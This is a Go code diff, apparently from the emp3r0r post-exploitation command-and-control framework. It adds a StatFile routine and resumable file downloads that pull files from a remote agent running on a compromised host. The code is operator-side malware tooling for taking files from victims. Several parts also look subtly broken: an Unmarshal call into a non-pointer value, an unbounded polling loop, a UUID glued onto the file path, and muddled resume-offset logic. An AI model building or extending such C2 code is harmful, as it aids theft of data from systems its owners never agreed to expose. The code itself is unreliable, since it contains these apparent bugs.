@@ -9,8 +9,10 @@ import (
 	"io/ioutil"
 	"os"
 	"strings"
+	"time"
 
 	"github.com/fatih/color"
+	"github.com/google/uuid"
 	"github.com/jm33-m0/emp3r0r/core/lib/agent"
 	"github.com/jm33-m0/emp3r0r/core/lib/tun"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
@@ -238,32 +240,70 @@ func PutFile(lpath, rpath string, a *agent.SystemInfo) error {
 	return nil
 }
 
+// StatFile Get stat info of a file on agent
+func StatFile(filepath string, a *agent.SystemInfo) (fi *os.FileInfo, err error) {
+	cmd := "!stat " + filepath + uuid.NewString()
+	err = SendCmd(cmd, a)
+	if err != nil {
+		return
+	}
+	var fileinfo os.FileInfo
+
+	for {
+		time.Sleep(100 * time.Millisecond)
+		res, exists := CmdResults[cmd]
+		if exists {
+			err = json.Unmarshal([]byte(res), fileinfo)
+			if err != nil {
+				return
+			}
+			fi = &fileinfo
+			break
+		}
+	}
+
+	return
+}
+
 // GetFile get file from agent
 func GetFile(filepath string, a *agent.SystemInfo) error {
 	var data agent.MsgTunData
+	filename := FileGetDir + util.FileBaseName(filepath) // will copy the downloaded file here when we are done
+	tempname := filename + ".downloading"                // will be writing to this file
 
-	// TODO stat target file, know its size, and allocate the file on disk
+	// stat target file, know its size, and allocate the file on disk
+	fi, err := StatFile(filepath, a)
+	if err != nil {
+		return fmt.Errorf("GetFile: failed to stat %s: %v", filepath, err)
+	}
+	fileinfo := *fi
+	filesize := fileinfo.Size()
+	err = util.AllocateFile(filename, filesize)
+	if err != nil {
+		return fmt.Errorf("GetFile: %s allocate file: %v", filepath, err)
+	}
+	CliPrintInfo("We will be downloading %s, %d bytes in total", filepath, filesize)
 
 	// what if we have downloaded part of the file
 	var offset int64 = 0
-	filename := FileGetDir + util.FileBaseName(filepath)
-	if util.IsFileExist(filename + ".downloading") {
-		fiTotal, err := os.Stat(filename + ".downloading")
+	if util.IsFileExist(tempname) {
+		fiTotal, err := os.Stat(filename)
 		if err != nil {
 			CliPrintWarning("GetFile: read %s: %v", filename, err)
 		}
-		fiHave, err := os.Stat(filename)
+		fiHave, err := os.Stat(tempname)
 		if err != nil {
-			CliPrintWarning("GetFile: read %s: %v", filename, err)
+			CliPrintWarning("GetFile: read %s: %v", tempname, err)
 		}
 		offset = fiTotal.Size() - fiHave.Size()
 	}
 
+	// tell agent where to seek the left bytes
 	cmd := fmt.Sprintf("#get %s %d", filepath, offset)
 
 	data.Payload = fmt.Sprintf("cmd%s%s", agent.OpSep, cmd)
 	data.Tag = a.Tag
-	err := Send2Agent(&data, a)
+	err = Send2Agent(&data, a)
 	if err != nil {
 		CliPrintError("GetFile: %v", err)
 		return err
